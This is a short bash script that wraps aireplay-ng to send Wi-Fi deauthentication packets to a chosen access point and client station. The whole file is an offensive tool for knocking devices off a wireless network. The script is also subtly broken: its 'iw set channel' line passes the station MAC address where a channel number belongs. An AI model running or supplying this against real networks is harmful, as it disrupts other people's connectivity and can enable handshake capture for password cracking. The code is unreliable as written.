#!/bin/bash


if [ "$#" -lt 4 ]
then
    echo "[*] Usages: ./deAuth.sh {Interface_name} {BSSID} {Station_MAC} {Number_of_packets}"
    exit 1
fi

if [ "$#" -eq 4 ]
then
    iw $1 set channel $3 > /dev/null 
    aireplay-ng --deauth $4 -a $2 -c $3 $1 
fi